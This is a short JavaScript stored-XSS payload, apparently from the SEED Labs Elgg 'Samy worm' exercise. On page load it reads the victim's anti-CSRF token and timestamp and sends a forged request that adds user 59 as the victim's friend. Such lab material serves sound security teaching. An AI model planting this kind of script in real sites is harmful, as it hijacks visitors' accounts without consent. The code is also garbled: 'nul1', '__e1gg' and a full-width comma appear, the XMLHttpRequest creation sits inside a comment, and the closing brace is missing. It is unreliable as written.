<script type="text/javascript"> window.onload = function (){
var Ajax = nul1;
var ts = "&__e1gg_ts=" + elgg.security.token.__e1gg_ts; // ①
var token = "&__e1gg_token=" + elgg.security.token.__e1gg_token; // ②
// Construct the HTTP request to add Samy as a friend.
var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
// Create and send Ajax request to add friend Ajax = new XMLHttpRequest();
Ajax.open("GET"，sendurl,true); Ajax.send();
</script>
